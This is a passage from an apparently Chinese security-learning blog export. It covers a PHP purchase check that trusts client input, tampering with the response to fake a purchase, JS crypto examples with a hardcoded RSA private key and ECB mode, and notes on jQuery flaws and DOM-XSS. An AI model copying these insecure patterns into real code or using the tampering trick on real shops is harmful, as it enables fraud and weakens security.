class="line"></span><br></pre></td></tr></table></figure><p>2）后端PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 从 POST 请求中获取购买数量</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设购物车中已有的金钱数为10000，商品价格为8888</span></span><br><span class="line"><span class="comment">// 真实情况下，应该在数据库中获取用户的金钱数等信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span></span><br><span class="line"><span class="variable">$success</span> = <span class="keyword">array</span>(<span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line"></span><br><span class="line">**<span class="comment">// 检查购买是否合法（金钱是否足够支付）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">10000</span> &gt;= (<span class="variable">$num</span> * <span class="number">8888</span>)) &#123;</span><br><span class="line">    <span class="comment">// 如果购买合法，设置信息代码为1表示购买成功</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果购买不合法，设置信息代码为0表示购买失败</span></span><br><span class="line">    <span class="variable">$success</span>[<span class="string">&#x27;infoCode&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果以 JSON 格式输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$success</span>);**</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>安全问题</p><p>将抓到的包，设置其返回包也抓取，并将访问失败返回包的改为1发送，后购买成功。</p></li></ol><h3 id="案例3编码加密"><a class="markdownIt-Anchor" href="#案例3编码加密"></a> 案例3：编码加密</h3><ol><li><p><strong>MD5</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 md5.<span class="property">js</span> 脚本 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/md5.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="title class_">JavaScript</span> 代码 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 定义字符串变量</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodi jichu No1&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 使用 md5.js 中的 md5 函数对字符串进行加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title function_">md5</span>(str1);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 输出加密后的字符串到控制台</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>SHA1</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 crypto-js.<span class="property">js</span> 脚本 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="title class_">JavaScript</span> 代码 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 定义字符串变量</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodisec&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 使用 CryptoJS.SHA1 函数对字符串进行 SHA-1 加密，并将结果转为字符串</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA1</span>(str1).<span class="title function_">toString</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 输出加密后的字符串到控制台</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>HMAC</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 引入 crypto-js.<span class="property">js</span> 脚本 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!-- <span class="title class_">JavaScript</span> 代码 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 定义密钥和字符串变量</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> key = <span class="string">&#x27;key&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str1 = <span class="string">&#x27;xiaodisec&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 使用 CryptoJS.HmacSHA256 函数生成 HMAC-SHA256 散列</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">HmacSHA256</span>(key, str1);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 将散列结果转为十六进制字符串</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> str_encode = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">stringify</span>(hash);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 输出加密后的字符串到控制台</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(str_encode);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 输出示例：&#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>AES</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// &quot;xiaodisec&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>DES</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/crypto-js.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> aseKey = <span class="string">&quot;12345678&quot;</span>     <span class="comment">// 定制秘钥，长度必须为：8/16/32位， 长度不一致也没问题</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&quot;xiaodisec&quot;</span>;  <span class="comment">// 需要加密的内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">encrypt</span>(message, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey),  <span class="comment">// 参数1=密钥, 参数2=加密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>, <span class="comment">// 为DES的工作方式</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>  <span class="comment">// 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(); <span class="comment">// toString=转字符串类型</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypt); <span class="comment">// 控制台打印 CDVNwmEwDRM</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="title class_">CryptoJS</span>.<span class="property">DES</span>.<span class="title function_">decrypt</span>(encrypt, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(aseKey), <span class="comment">// 参数1=密钥, 参数2=解密内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    ).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>); <span class="comment">// toString=转字符串类型,并指定编码</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(decrypt); <span class="comment">// 控制台打印 &quot;i am xiaozhou ?&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>RSA</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/jsencrypt.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 公钥 私匙是通过公匙计算生成的，不能盲目设置</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> <span class="variable constant_">PUBLIC_KEY</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ==-----END PUBLIC KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> <span class="variable constant_">PRIVATE_KEY</span> = <span class="string">&#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//使用公钥加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();<span class="comment">//实例化加密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    encrypt.<span class="title function_">setPublicKey</span>(<span class="variable constant_">PUBLIC_KEY</span>);<span class="comment">//设置公钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&#x27;xiaodisec&#x27;</span> <span class="comment">// 需要加密的数据</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypted = encrypt.<span class="title function_">encrypt</span>(message);<span class="comment">//对指定数据进行加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypted)  <span class="comment">// &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w==&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//使用私钥解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); <span class="comment">// 创建解密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    decrypt.<span class="title function_">setPrivateKey</span>(<span class="variable constant_">PRIVATE_KEY</span>); <span class="comment">//设置私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> uncrypted = decrypt.<span class="title function_">decrypt</span>(encrypted); <span class="comment">//解密 &#x27;xiaodisec&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(uncrypted);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h2 id="js-第三方库安全"><a class="markdownIt-Anchor" href="#js-第三方库安全"></a> JS 第三方库安全</h2><h3 id="jquery-安全"><a class="markdownIt-Anchor" href="#jquery-安全"></a> JQuery 安全</h3><p>JQuery版本对应漏洞在线查询网站：<a href="https://research.insecurelabs.org/jquery/test/">https://research.insecurelabs.org/jquery/test/</a></p><p><a href="https://blog.csdn.net/weixin_44309905/article/details/120902867">Javascript框架库漏洞验证</a></p><h1 id="js-dom"><a class="markdownIt-Anchor" href="#js-dom"></a> JS DOM</h1><ol><li><p><strong>具体概念与语法</strong>：仍然是参考我的那篇javascript学习博客</p></li><li><p><strong>DOM技术修改前端内容的安全问题</strong>：</p><p>如果前端的代码允许用户提供数据（例如通过输入框、URL参数、HTTP请求等），并且这些数据被直接插入到DOM中，就存在潜在的风险：如<strong>DOM-XSS攻击</strong>等。</p><p>举个例子，假设有一个网站让用户输入姓名并将其显示在页面上。如果这段输入没有被适当处理（如没有进行HTML编码或过滤），攻击者就可以通过输入恶意的JavaScript代码来操控页面。</p></li><li><p><strong>实战案例</strong></p><ul><li><p>网易云翻译：可以使用带外dns，造成数据库ip泄露</p><p>见：<a href="https://www.bilibili.com/video/BV123yAYMEwb?spm_id_from=333.788.videopod.episodes&amp;vd_source=78fe120d7956471b1c17e0b76956e9f9&amp;p=29">小迪安全</a>第29集0:39</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『安全开发』PHP安全开发</title>
      <link href="/posts/5bfc.html"/>
      <url>/posts/5bfc.html</url>
      
        <content type="html"><![CDATA[<p>本文并不是系统的介绍如何进行PHP开发，而是从安全漏洞的视角来学习<strong>如何看懂</strong>大部分的php web开发代码，从而可以<strong>更方便的了解漏洞原理</strong>。</p><h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><p>PHP（全称：PHP：Hypertext Preprocessor，即&quot;PHP：超文本预处理器&quot;）是一种通用开源脚本语言，PHP 脚本一般在服务器上执行。</p><p><strong>PHP脚本</strong>以 <code>&lt;?php</code> 开始，以 <code>?&gt;</code> 结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// PHP 代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>PHP 文件</strong>通常包含 HTML 标签和一些 PHP 脚本代码，其中PHP 脚本可以放在文件中的任何位置。</p><p>一个简单的PHP文件示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;My first PHP page&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h1><p>一些基本的PHP语法参考：<a href="https://www.runoob.com/php/php-tutorial.html">菜鸟PHP 教程</a></p><h2 id="函数对象调用"><a class="markdownIt-Anchor" href="#函数对象调用"></a> 函数对象调用</h2><p>使用字符串调用函数：直接用字符串变量存储函数名，并调用它。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;sayHello&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>(<span class="string">&#x27;PHP&#x27;</span>);  <span class="comment">// 输出: Hello, PHP!</span></span><br></pre></td></tr></table></figure><h2 id="超全局变量"><a class="markdownIt-Anchor" href="#超全局变量"></a> 超全局变量</h2><p>参考：<a href="https://www.w3school.com.cn/php/php_superglobals.asp">PHP 全局变量 - 超全局变量</a></p><p>PHP 中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可用。在函数或方法中无需执行 <code>global $variable;</code> 就可以访问它们，超全局变量包括以下几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS用于在 PHP 脚本中的任意位置访问全局变量</span><br><span class="line">$_SERVER保存关于报头、路径和脚本位置的信息。</span><br><span class="line">$_REQUEST用于收集 HTML 表单提交的数据。</span><br><span class="line">$_POST用于收集提交 method=&quot;post&quot; 的HTML表单后的表单数据。</span><br><span class="line">$_GET收集URL中的发送的数据，也可用于收集提交HTML表单数据(method=&quot;get&quot;) $_FILES文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容。</span><br><span class="line">$_ENV是一个包含服务器端环境变量的数组。</span><br><span class="line">$_COOKIE是一个关联数组，包含通过cookie传递给当前脚本的内容。</span><br><span 